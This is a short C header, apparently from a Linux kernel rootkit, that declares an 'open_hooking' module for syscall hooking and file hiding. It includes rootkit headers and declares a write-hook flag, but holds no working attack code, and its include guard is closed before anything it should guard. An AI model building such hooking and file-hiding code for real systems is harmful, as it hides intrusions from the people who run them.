#ifndef OPEN_HOOKING_H
#define OPEN_HOOKING_H
#endif

#include <linux/dirent.h>	// For getdents64

#include "hack_pi.h"
#include "syscall_table.h"

BROOTUS_MODULE(open_hooking);    // Macros for init_file_hiding
extern bool HOOK_WRITE;
